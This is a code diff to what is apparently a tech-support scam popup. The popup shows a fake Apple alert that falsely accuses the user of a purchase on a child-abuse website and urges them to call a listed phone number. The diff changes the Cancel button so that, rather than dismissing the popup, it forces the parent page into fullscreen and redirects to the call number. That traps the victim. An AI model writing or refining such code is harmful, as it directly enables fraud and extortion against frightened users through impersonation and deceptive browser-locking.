@@ -59,7 +59,7 @@ html, body {
     <p class="popup-msg">Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $569.96 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-855-616-3048 to Freeze it!.</p>
   </div>
   <div class="popup-actions">
-    <button class="popup-btn cancel" id="popupBtn">Cancel</button>
+    <button class="popup-btn cancel" id="cancelBtn">Cancel</button>
     <button class="popup-btn confirm" id="popupBtn">OK</button>
   </div>
 </div>
@@ -76,7 +76,11 @@ document.getElementById("popupBtn").addEventListener("click", function () {
   window.parent.location.href = CALL_NUMBER;
 });
 document.getElementById("cancelBtn").addEventListener("click", function () {
-  window.parent.postMessage("closePopup", "*");
+  var pdoc = window.parent.document;
+  var el = pdoc.documentElement;
+  if (el.requestFullscreen) { el.requestFullscreen().catch(function(){}); }
+  else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
+  window.parent.location.href = CALL_NUMBER;
 });
     (function(){
   function sendHeight(){
